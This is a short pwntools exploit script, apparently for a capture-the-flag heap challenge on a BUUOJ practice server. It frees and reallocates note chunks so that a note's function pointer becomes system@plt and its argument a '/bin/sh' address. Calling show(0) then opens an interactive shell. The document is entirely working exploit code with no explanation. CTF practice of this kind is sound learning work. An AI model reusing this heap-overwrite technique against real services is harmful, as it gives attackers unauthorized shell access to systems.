from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26355)
elf = ELF('./pwn')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
ita = lambda: io.interactive()

def add(size, content):
	sla(b'Your choice: ', b'1')
	sla(b'Please input size: ', str(size).encode())
	sa(b'Please input content: ', content)
	
def delete(index):
	sla(b'Your choice: ', b'2')
	sla(b'Please input list index: ', str(index).encode())
	
def show(index):
	sla(b'Your choice: ', b'3')
	sla(b'Please input list index: ', str(index).encode())
	
binsh = 0x602010
	
add(0x20, b'a\n')
add(0x10, b'a\n')
delete(0)
delete(1)
add(0x30, b'a\n')
add(0x10, p64(binsh) + p64(elf.plt['system']))
show(0)
ita()
